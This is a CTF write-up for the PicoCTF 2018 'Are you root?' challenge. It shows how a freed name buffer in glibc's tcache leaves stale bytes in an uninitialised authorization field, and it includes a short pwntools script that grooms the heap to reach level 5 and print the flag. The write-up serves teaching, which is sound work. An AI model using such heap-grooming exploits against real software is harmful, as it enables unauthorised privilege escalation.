---
slug: are-you-root
title: Are you root?
authors: [nguyen]
tags: [PicoCTF 2018, Binary Exploitation, Heap grooming]
---

2018 PicoCTF: Are you root?

<!--truncate-->

## The Challenge

The provided executable [here](/files/are_you_root/auth)

The goal is to obtain the flag.

## Analysis

Running the program on a terminal gives us an interface we can login as a user. We are given the option to set the authorization level below 5. In order to get the flag, we must be able to set the authorization to level 5.

After looking through the source file, we can see that allocated memory is not initalized for the `user` struct member `level`. `user->name` is free'd upon receiving the `reset` command but the `user` struct itself is not freed.

We can use gdb with the gef extension to look more closely into the heap memory as we run the program. I have a breakpoint set at `putchar` as it is right before `fgets` is called for user input. I run `heap chunks` and `heap bins` to look at the current status of the heap.

![Initial heap and bin](/img/are_you_root/initial_heap.png)

As expected, there is no memory allocated on the heap or stored in bins yet.

I enter `login aaaaaaaaaaaaaaaaaaaa` to login as a user named containg 20 'A's and look at `heap chunks` and `heap bins`.

![Heap and bin after first login](/img/are_you_root/login_heap.png)

Viewing the chunks shows the stdin buffer containing the input string. Under it is a chunk that contains a pointer to the chunk below it. This makes me think that it is the user struct containing the pointer to the user name. The chunk with user name contains the 'a's as expected.

I enter `reset` to free user name and look at the updated `heap chunks` and `heap bins`.

![Heap and bin after reset](/img/are_you_root/reset.png)

When free is called on `user->name`, the chunk containing the name string is stored in tcache.

If we log in again and look at the heap chunks, we can see that the free'd memory still contains a part of the username provided previously. The first 8 bytes are zero'd out but the rest remain the same. I enter `login b` and view the updated heap and bins.

![Logging in after reset](/img/are_you_root/second_login.png)

The chunk at 0x603260 is the stdin buffer as it contains `reset` and 'a's. The 'a's are still there because stdin is not flushed and a null terminator separates the strings. The user struct is still in the chunks since it was not freed. Tcache is now empty because the chunk is being reused by the new user struct.

Entering `show` then gives us the output below:

![show on second login](/img/are_you_root/show.png)

The authorization level is actually the decimal conversion of 4 'a's. These 'a's are the ones that had remained on the heap after `user->name` had been free'd from the `reset` command.

We can manipulate the heap in a way so that the value `5` will be stored in the new user's level from running `login`. I will have the first 8 bytes set as 'a's and the following byte to be 0x05.

```python
#!/usr/bin/env python3

"""
Toast's submission for the challenge 'Are you Root'.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./auth")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    io = process([exe.path])
    return io


def main():
    '''Return the flag.
    '''
    return get_flag()


def get_flag():
    '''Get the flag'''
    with conn() as io:
        payload = str.encode("login aaaaaaaa") + b'\x05'
        io.sendlineafter(b"> ", payload)
        io.sendlineafter(b"> ", b"reset")
        io.sendlineafter(b"> ", b"login bob")
        io.sendlineafter(b"> ", b"get-flag")
        flag = str(io.recvline())
        io.success("Flag found: " + flag)
        return flag


if __name__ == '__main__':
    main()
```

This attack is successful because of how the glibc heap management works. Data that is freed will be stored in tcache if it meets size requirements and has space to store chunks. Tcache is the first place that is checked for memory allocation or placing free'd chunks. Tcache is meant to speed up performance because it is thread specific and does not require the bin to be locked for modification. If the program called a function pointer instead of checking an integer value, I would be able to call the `give_flag()` function directly.

## References

[Sourceware glibc Wiki](https://sourceware.org/glibc/wiki/MallocInternals)
